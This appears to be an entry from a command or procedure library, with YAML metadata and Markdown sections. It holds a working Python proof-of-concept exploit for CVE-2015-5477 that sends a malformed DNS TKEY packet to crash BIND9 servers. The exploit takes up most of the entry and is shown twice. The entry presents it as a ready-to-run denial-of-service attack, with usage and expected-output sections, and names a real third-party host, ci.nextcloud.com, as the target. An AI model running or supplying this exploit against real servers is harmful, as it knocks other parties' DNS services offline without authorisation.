---
data: >-
  #!/usr/bin/env python

  import socket

  import sys


  print('CVE-2015-5477 BIND9 TKEY PoC')


  if len(sys.argv) < 2:
      print('Usage: ' + sys.argv[0] + ' [target]')
      sys.exit(1)

  print('Sending packet to ' + sys.argv[1] + ' ...')


  payload = bytearray('4d 55 01 00 00 01 00 00 00 00 00 01 03 41 41 41 03 41 41
  41 00 00 f9 00 ff 03 41 41 41 03 41 41 41 00 00 0a 00 ff 00 00 00 00 00 09 08
  41 41 41 41 41 41 41 41'.replace(' ', '').decode('hex'))


  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

  sock.sendto(payload, (sys.argv[1], 53))


  print('Done.')


  python tkeypoc.py ci.nextcloud.com
tags:
  - exploit
  - dos
  - python
type: command
output: null
executor: bash
platforms:
  - Linux
id: 90413c4d-b5f1-43d1-a491-2acbce792042
created_at: '2025-12-14T17:26:36.878Z'
updated_at: '2025-12-14T17:26:36.878Z'
verified: false
validated: true
submitted: true
---
# execute-bind9-tkey-poc

## Command

```bash
#!/usr/bin/env python
import socket
import sys

print('CVE-2015-5477 BIND9 TKEY PoC')

if len(sys.argv) < 2:
    print('Usage: ' + sys.argv[0] + ' [target]')
    sys.exit(1)

print('Sending packet to ' + sys.argv[1] + ' ...')

payload = bytearray('4d 55 01 00 00 01 00 00 00 00 00 01 03 41 41 41 03 41 41 41 00 00 f9 00 ff 03 41 41 41 03 41 41 41 00 00 0a 00 ff 00 00 00 00 00 09 08 41 41 41 41 41 41 41 41'.replace(' ', '').decode('hex'))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(payload, (sys.argv[1], 53))

print('Done.')

python tkeypoc.py ci.nextcloud.com
```

## Description

Executes a Python script to send a malformed UDP DNS TKEY query to the target, exploiting CVE-2015-5477 in BIND9 to cause a denial of service by crashing the server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Target (positional) | Hostname or IP (e.g., ci.nextcloud.com) | Yes |
| Port | Hardcoded to 53 (UDP) | No |

## Examples

### Basic Usage

```bash
python tkeypoc.py ci.nextcloud.com
```

### Advanced Usage

Save script as tkeypoc.py and run with target argument.

## Expected Output

CVE-2015-5477 BIND9 TKEY PoC
Sending packet to ci.nextcloud.com ...
Done.

## Related

- [[Related Procedure: Exploit-BIND9-TKEY-Vulnerability-with-PoC]]
